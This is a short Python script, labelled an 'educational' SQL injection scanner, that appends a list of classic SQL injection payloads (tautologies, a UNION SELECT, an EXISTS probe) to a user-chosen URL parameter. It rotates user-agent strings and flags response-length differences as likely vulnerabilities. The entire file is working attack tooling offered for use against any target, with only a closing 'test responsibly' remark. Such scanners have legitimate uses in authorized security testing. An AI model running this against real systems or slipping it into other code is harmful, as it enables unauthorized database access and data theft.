import requests
import urllib.parse
import random
import time


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]


SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' OR 'x'='x",
    "' OR 1=1#",
    "' OR 1=1 LIMIT 1--",
    "' AND 1=0 UNION SELECT NULL--",
    "' OR EXISTS(SELECT * FROM users)--"
]

def random_headers():
    """Generate headers with a random user-agent."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Connection": "close"
    }

def build_url(base_url, param, payload):
    """Inject payload into the specified parameter in the URL."""
    parsed = urllib.parse.urlparse(base_url)
    query = dict(urllib.parse.parse_qsl(parsed.query))
    query[param] = payload
    new_query = urllib.parse.urlencode(query)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))

def perform_test(base_url, param):
    print("\n🔍 Starting SQL injection test...")
    print(f"Target URL: {base_url}")
    print(f"Testing parameter: {param}\n")

    try:
        baseline = requests.get(base_url, headers=random_headers(), timeout=5)
        baseline_length = len(baseline.text)
        print(f"[i] Baseline response length: {baseline_length}")
    except Exception as e:
        print(f"[!] Failed to connect to target: {e}")
        return

    for payload in SQLI_PAYLOADS:
        time.sleep(0.5)  
        injected_url = build_url(base_url, param, payload)

        try:
            response = requests.get(injected_url, headers=random_headers(), timeout=5)
            response_length = len(response.text)
            diff = abs(response_length - baseline_length)

            print(f"[*] Payload tried: {payload:<30} | Difference: {diff}")

            if diff > 30:
                print(f"✅ Possible SQL Injection detected!")
                print(f"   Injected URL: {injected_url}\n")

        except requests.exceptions.RequestException as error:
            print(f"[!] Error with payload '{payload}': {error}")

    print("\n Scan complete. Always test responsibly.")

if __name__ == "__main__":
    print(" SQL Injection Educational Scanner")
    print("-------------------------------------")

    target = input("Enter the full URL (e.g. http://example.com/page.php?id=1): ").strip()
    param = input("Which parameter should we test? (e.g. id): ").strip()

    if not target or not param:
        print("[!] Missing input. Please provide both a URL and a parameter.")
    else:
        perform_test(target, param)
